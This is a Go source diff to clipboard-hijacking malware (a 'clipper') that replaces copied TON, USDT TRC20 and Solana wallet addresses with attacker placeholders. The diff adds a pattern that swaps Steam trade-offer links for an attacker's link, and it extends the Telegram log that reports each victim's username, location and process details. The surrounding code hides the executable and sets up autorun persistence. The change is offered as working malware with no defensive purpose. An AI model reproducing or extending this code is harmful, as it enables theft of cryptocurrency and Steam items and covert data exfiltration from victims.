@@ -21,6 +21,8 @@ var (
 	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9A-Za-z_-]{46,48}$`)
 	usdttrcRegex = regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`)
 	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
+
+	steamTradeRegex = regexp.MustCompile(`(https?:\/\/)?steamcommunity\.com\/tradeoffer\/new\/\?partner=\d+(&token=[\w\-]+)?`)
 )
 
 /* *** change this *** */
@@ -32,6 +34,10 @@ var matchers = []clipper.Matcher{
 	{Regex: tonRegex, Addr: "ton_clipped"},         // TON
 	{Regex: usdttrcRegex, Addr: "usdttrc_clipped"}, // USDT TRC20
 	{Regex: solRegex, Addr: "sol_clipped"},         // Solana
+	{
+		Regex: steamTradeRegex,
+		Addr:  "https://steamcommunity.com/tradeoffer/new/?partner=1488&token=CLIPPED",
+	},
 }
 
 /* *** change this *** */
@@ -50,7 +56,7 @@ func main() {
 
 	// send start log to telegram
 	telegram.SendLog(fmt.Sprintf(
-		"🟢 %s (%s)\n%s\nPID %d",
+		"🟢 %s (%s)\n<code>%s</code>\nPID <code>%d</code>",
 		user.Username,
 		geo,
 		selfPath,
@@ -64,7 +70,7 @@ func main() {
 	_ = hide.HideFile(selfPath)
 
 	// we starting main clipper process
-	clipper.StartClipper(chat_id, bot_token, matchers)
+	clipper.StartClipper(chat_id, bot_token, matchers, user.Username)
 
 	// we starting autorun watcher
 	autorun.StartWatcher(selfPath, selfName)
